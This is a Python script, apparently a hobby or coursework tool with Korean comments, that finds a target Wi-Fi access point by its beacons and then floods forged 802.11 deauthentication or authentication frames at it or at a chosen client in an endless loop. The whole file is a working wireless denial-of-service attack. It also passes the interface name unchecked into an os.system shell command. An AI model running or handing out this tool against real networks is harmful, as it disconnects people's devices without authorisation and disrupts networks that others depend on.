import socket
import sys
import os
import time
from struct import *

class RadiotapHeader :
    def __init__(self) :
        self.Header_revision = b'\x00'
        self.Header_pad = b'\x00'
        self.Header_length = pack('h', 12)
        self.Present_flags_word = b'\x04\x80\x00\x00'
        self.Flags = b''
        self.Data_rate = b'\x02\x00'
        self.Channel_frequency = b''
        self.Channel_flags = b''
        self.Antenna_signal1 = b''
        self.RX_flags = b'\x18\x00'
        self.Antenna_signal2 = b''

    def len24(self, ch) :
        self.Header_length = pack('h', 24)
        self.Present_flags_word = b'\x2e\x40\x00\xa0\x20\x08\x00\x00'
        self.Flags = b'\x00'
        self.Data_rate = b'\x0c'
        self.Channel_frequency = pack('h', ch)
        self.Channel_flags = b'\xa0\x00'
        self.Antenna_signal1 = pack('b', -35) + b'\x00'
        self.RX_flags = b'\x00\x00'
        self.Antenna_signal2 = self.Antenna_signal1

class Dot11Frame :
    def __init__(self, ds, ts, seq) :
        self.Frame_control = b''
        self.Duration = b'\x3a\x01'
        self.Ds_address = ds
        self.Ts_address = ts
        self.BSS_id = b''
        self.Sequence_number = pack('H', (seq % 4095) << 4)
        self.Fixed = b''

    def Deauth(self) :
        self.Frame_control = b'\xc0\x00'
        self.BSS_id = self.Ts_address
        self.Fixed = b'\x07\x00'
    
    def Auth(self) :
        self.Frame_control = b'\xb0\x00'
        self.BSS_id = self.Ds_address

class FixedParameter :
    def __init__(self) :
        self.Auth_algorithm = b'\x00\x00'
        self.Auth_SEQ = b'\x01\x00'
        self.Status_cod = b'\x00\x00'

progress = [' / ', ' | ', ' \\ ', '---']

def beacon_check(interface_name, bssid) :
    try:
        rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        rawSocket.bind((interface_name,0))
        rawSocket.settimeout(0.3)
        packet = rawSocket.recvfrom(2048)[0]
        # 인터페이스 패킷 캡처
        rawSocket.close()
    except:
        return None
    
    radiotap_header_length = unpack('>bb', packet[2:4])[0]
    if radiotap_header_length == 0:
        return None # 가끔 오류나는 것 때문에
    radiotap_header = packet[0:radiotap_header_length]
    channel = unpack('h', radiotap_header[14:16])[0]
    frame_data = packet[radiotap_header_length:]
    beacon_check = frame_data[0:1]

    if beacon_check == b'\x80' :
        packet_bssid = frame_data[16:22]
        sequence = unpack('H', frame_data[22:24])[0] >> 4
        if bssid == packet_bssid :
            return {"sequence" : sequence, "channel": channel}
        else :
            return None
    else :
        return None

def deauth_attack(ap, station, seq) :
    while 1:
        rh = RadiotapHeader()
        radiotap_header_packet = bytes()
        for value in rh.__dict__.values():
            radiotap_header_packet += value
        # Radiotap_Header

        if seq % 2 == 0:
            da = Dot11Frame(station, ap, seq)
        else:
            da = Dot11Frame(ap, station, seq)
        # station -> ap, ap -> station
        da.Deauth()
        deauthentication_packet = bytes()
        for value in da.__dict__.values():
            deauthentication_packet += value
        # Deauthentication

        seq += 1

        rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        rawSocket.bind((interface_name,0))
        rawSocket.send(radiotap_header_packet + deauthentication_packet)
        rawSocket.close()
        print("\rDeauthentication 전송 중 " + progress[seq % 4], end='')
        time.sleep(0.01)

def auth_attack(ch, ap, station, seq) :
    while 1:
        rh = RadiotapHeader()
        rh.len24(ch)
        radiotap_header2_packet = bytes()
        for value in rh.__dict__.values():
            radiotap_header2_packet += value
        # Radiotap_Header
        
        at = Dot11Frame(ap, station, seq)
        at.Auth()
        authentication_packet = bytes()
        for value in at.__dict__.values():
            authentication_packet += value
        # Authentication

        fp = FixedParameter()
        fixedparameter_packet = bytes()
        for value in fp.__dict__.values():
            fixedparameter_packet += value
        # Fixed_Parameter

        seq += 1

        rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        rawSocket.bind((interface_name,0))
        rawSocket.send(radiotap_header2_packet + authentication_packet + fixedparameter_packet)
        rawSocket.close()
        print("\rAuthentication 전송 중 " + progress[seq % 4], end='')
        time.sleep(0.01)


def str2mac(string) :
    mac = bytes()
    for b in string.split(":") :
        mac += pack("B", int(b, 16))
    return mac



if len(sys.argv) <  3 & len(sys.argv) > 5:
    print("syntax : sudo python3 deauth-attack.py <interface> <ap mac> [<station mac> [-auth]]")
    sys.exit()

interface_name = sys.argv[1]
ap = str2mac(sys.argv[2])
if len(sys.argv) >= 4 :
    station = str2mac(sys.argv[3])
else :
    station = b'\xff\xff\xff\xff\xff\xff'

channel = 1
os.system("iwconfig " + interface_name + " channel " + str(channel))
while 1:
    info = beacon_check(interface_name, ap)
    if info is None:
        channel = (channel + 5) % 14
        if channel == 0 :
            channel += 1
        os.system("iwconfig " + interface_name + " channel " + str(channel))
    else :
        break

ch = int(info['channel'])
# seq = int(info['sequence'])
print("채널: " + str((ch - 2407) // 5))

if len(sys.argv) == 5:
    if sys.argv[4] == "-auth": # auth attack
        auth_attack(ch, ap, station, 0)
    else :
        print("syntax : sudo python3 deauth-attack.py <interface> <ap mac> [<station mac> [-auth]]")
        sys.exit()
else : # deauth attack
    deauth_attack(ap, station, 0)